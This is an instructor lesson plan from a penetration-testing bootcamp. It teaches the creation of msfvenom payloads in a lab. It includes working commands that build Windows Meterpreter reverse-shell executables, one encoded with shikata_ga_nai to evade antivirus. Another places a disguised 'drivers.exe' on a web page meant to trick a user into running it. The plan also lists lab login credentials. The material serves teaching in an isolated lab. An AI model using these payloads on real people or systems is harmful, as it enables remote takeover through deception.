## 17.3 Lesson Plan: Custom Payloads with msfvenom

### Overview

In this lesson, we will conclude our two units on pen testing by crafting custom payloads. 

### Class Objectives

By the end of class, students will be able to:

- Create custom payloads.

- Add payloads to websites by altering HTML. 

- Assess their overall penetration test engagement skills. 

### Lab Environment

<details><summary>Lab Details</summary>
<br>

In this unit, you will be using the Pentesting lab environment located in Windows Azure Lab Services. RDP into the Windows RDP Host machine using the following credentials:

  - Username: `azadmin`
  - Password: `p4ssw0rd*`

Open Hyper-V Manager to access the nested machines with the following credentials:

**Kali machine:**

  - Username: `root`
  - Password: `toor`

**Metasploitable machine:**
  - Username: `msfadmin`
  - Password: `msfadmin`

**ShellShock**:

  - Username: `vagrant`
  - Password: `vagrant`

**Heartbleed**:

  - Username: `vagrant`
  - Password: `vagrant`

**DVWA10**:

  - Username: `IEuser`
  - Password: `Passw0rd!`

In today's class, we'll use the Kali machine and the DVWA10 machine.

**Note:** Since the IP addresses are dynamic, the IP addresses used in the demos and activities should be treated as examples. The actual IP addresses will need to be determined before starting the exercises.

</details>  


### Slideshow

- Slides for this lesson are available on Google Drive, located here: [17.3 Slides](https://docs.google.com/presentation/d/1ZfjDj2n9JO1fUG7bulmC2RT_9Ckgjs6itn4Do282oEY/edit#slide=id.g4789b2c72f_0_6)

- To add slides to the student-facing repository, download the slides as a PDF by navigating to File > "Download as" and choose "PDF document." Then, add the PDF file to your class repository along with other necessary files.

- Editing access is not available for this document. If you or your students wish to modify the slides, you will need to make your own version by navigating to File > "Make a copy...".

### Time Tracker

- The time tracker for this lesson is available on Google Drive here: [17.3 Time Tracker](https://docs.google.com/spreadsheets/d/1ESS0Pzrw6-LjXQ9I4_UsaL1rsocj1uCGFbfoVdH4XLw/edit#gid=0)

### Student Guide

- Send out a student-facing version of the lesson plan: [Student Guide](StudentGuide.md)
____


### 01. Instructor Do: Custom Payloads (0:30)

Welcome students back to class and review the five pen testing stages: 

1. Planning and Reconnaissance
2. Scanning
3. Exploitation
4. Post Exploitation
5. Reporting

Explain that today's class will continue with Post Exploitation. 

Think back to the last class. While making a Meterpreter session, we used the following custom payload: 

  - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.8 LPORT=4444 -f exe > hack.exe`

Today, we'll learn how to create payloads like this one using Metasploit.

- Remind students that a payload is the shell code that runs when an exploit successfully compromises a system.

- Attackers typically build custom payloads that they can use in phishing emails or add to their websites. When unsuspecting users click the link for the malicious payload, their computers are infected.

The exploitation of services is not as common as it was a decade ago. This is due to the use of defense countermeasures like endpoint detection and response,  AV solutions, and IPS/IDS implementation. 

- While patching mitigates vulnerable services, attackers will deliver custom payloads through social engineering if they cannot exploit services.

- Since C2 servers have dynamic IP addresses, attackers often have to create their own customized payloads that call back to their C2 server using SYN packets.

- Custom payloads allow customization of various payload options such as:

  - Architecture
  - Shell type
     - Reverse
     - Bind
     - Meterpreter
     - Other proprietary C2 shell


Explain that in order to create these payloads, attackers  use a tool called `msfvenom`. 

-  `msfvenom` is a Metasploit framework tool used to generate and encode payloads. 


- `msfvenom` is part of the Metasploit framework, but Metasploit does not need to be running in order to use `msfvenom`. 


While it's relatively easy to create custom payloads, the real challenge is creating a payload that bypasses network detection by IDS and antivirus (AV) solutions.

Explain that **encoding** is a method used to evade detection tools.

   - It changes the signature of an exploit or payload, creating a new signature that has no written rule.

   - This change in signature allows payloads to bypass detection from AV and IDS tools that detect known malicious signatures.

Explain that we'll now walk through the basics of `msfvenom`'s help menu and use some basic command options available for use with encoders, payloads, and formats.

####  Custom Payload Creation with msfvenom Demonstration

Log into the  Kali Linux (Attacker) VM.

1. First, we'll look at `msfvenom`'s help menu to see which command options are available.

   Launch the terminal and type the following command:

      - `msfvenom`

      ![MSV 1](Images/MSV_1.png)

   - We are presented with a list of all available command options for `msfvenom`.

   Let's take a look at some of the most important options in this list:

    - `-p` designates the Metasploit payload we want to use.
    - `-e` designates the encoder we want to use.
    - `-a` designates the architecture we want to use (the default is `x86`).
    - `-s` designates the maximum size of the payload.
    - `-i` designates the number of iterations with which to encode the payload.
    - `-x` designates a custom executable file to use as a template.
    - `-o` designates an output file to be created, specifying its name and location.

2. Next, list all of the available payloads: 

   Type the following command:

   - `msfvenom -l payloads`

      - Output should provide a list of all currently installed payloads in alphabetical order by name and description.


       ![MSV 4](Images/MSV_4.png)

3. List all of the executable file and transform formats supported by `msfvenom`.

   Type the following command:

   - `msfvenom -l formats`

      - We're presented with a list of all of the file formats in which payloads can be delivered.

     ![MSV 2](Images/MSV_2.png)

4. List  `msfvenom`'s encoders. The encoders are various algorithms and encoding schemes that Metasploit uses to re-encode payloads.

     Type the following command:

     - `msfvenom -l encoders`

      ![MSV 3](Images/MSV_3.png)

   Without `msfvenom`, we would have to re-encode a payload by piping the `msfpayload` command through the `msfencode` command. `msfvenom` does both actions, and more, in a single command.


#### Msfvenom command structure

Now we'll cover the basics of `msfvenom`'s custom payload command options.

- Display the following command to the class:

   - `msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe -o /tmp/hack.exe LHOST=192.168.0.8 LPORT=4444`

   - Break down the syntax:
      - `msfvenom`: Launches the `msfvenom` program.

      - `-p`: Indicates payload. 

      - `windows/meterpreter/reverse_tcp`: The Metasploit command module.

      - `-a x86`: Designates the architecture we will use. `x86` is default.

      - `-e x86/shikata_ga_nai`: Designates the encoder we will use.

      - `-f exe`: Indicates the file type to create. In this case, `.exe`.

      - `-o /tmp/malware.exe`: Creates an output file, naming the file (`malware.exe`) and location (inside the `/tmp` directory).

- Next, display the command used in the previous lesson and have students break it down themselves: 

  - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.8 LPORT=4444 -f exe > hack.exe`

      - `msfvenom`: Launches the `msfvenom` program.
      - `-p`: Indicates payload. 
      - `windows/meterpreter/reverse_tcp`: The Metasploit command module.
      - `-f exe`: Creates a `.exe` file type.


Pause to answer questions before proceeding.

Explain that in the next activity, students will build their own custom command in an exploitation attack.


### 02. Student Do: Creating Custom Payloads (0:25)

Explain the following:

In this activity, you will play an independent penetration tester hired by the law firm Jacoby and Dreyer LLP.

- The firm wants you to test the effectiveness of their security awareness program. They suspect that one of their employees is being careless with their internet use and not adhering to company security policies.

- You've decided to use a social engineering tactic to convince the employee to click on a link in their web browser. The legal firm has provided you with the employee's IP address.

- Specifically, you will use `msfvenom`'s custom payload options to build a malicious file that will link to a webpage for the targeted employee to click on.

- [Activity File: Creating Custom Payloads](Activities/01_Creating_Custom_Payloads/Unsolved/README.md)

### 03. Instructor Review: Creating Custom Payloads Activity (0:15)

Remind students that the goal of this activity was to craft customized payload options and understand how criminal hackers use them to bypass security controls.

Point out the major milestones of this activity:

- Using `msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=172.16.203.164 LPORT=4444 -o /var/www/html/drivers.exe` to create a customized payload.

- Using `nano index.html` to create a malicious website.

Send students the following solution file and use it to guide your review:

- [Solution File: Creating Custom Payloads](Activities/01_Creating_Custom_Payloads/Solved/README.md)

### 05. Break (0:15)


### 06. Instructor Do: Intro to the Pen Testing Homework (0:05)

Explain to class that we'll now get started on a pen testing homework activity. We have set aside time during class for questions and to provide additional support if needed.

Explain that this activity, you will complete a capture the flag activity. You will need to answer a set of questions and fill out a report template as your homework submission.

Explain to the students that before you begin, we'll need to start the Icecast server to emulate the CEO's computer. 
- Log onto the DVW10 machine (credentials `IEUser:Passw0rd!`) and wait for the Icecast application to popup.
- Then click `Start Server`. 

### 07. Student Do: Pen Testing Homework (To End of Class) 

Explain the following:

- In this activity, you will play the role of an independent penetration tester hired by GoodCorp Inc. to perform security tests against their CEO’s workstation.

- You will use all of the steps of a pentest: 

1. Planning and Reconnaissance
2. Scanning
3. Exploitation
4. Post Exploitation
5. Reporting

- The assignment concludes with a report about your findings.

#### The Scenario

- The CEO claims to have passwords that are long and complex and therefore unhackable.

- You are tasked with gaining access to the CEO's computer and using a Meterpreter session to search for two files that contain the strings `recipe` and `secretfile`.

- The deliverable for this engagement will be in the form of a report labeled `Report.docx`.

Send students the following activity file:

- [Activity File: Penetration Test Engagement](Activities/07_Pentest_Engagement/Unsolved/README.md)

---
© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.  
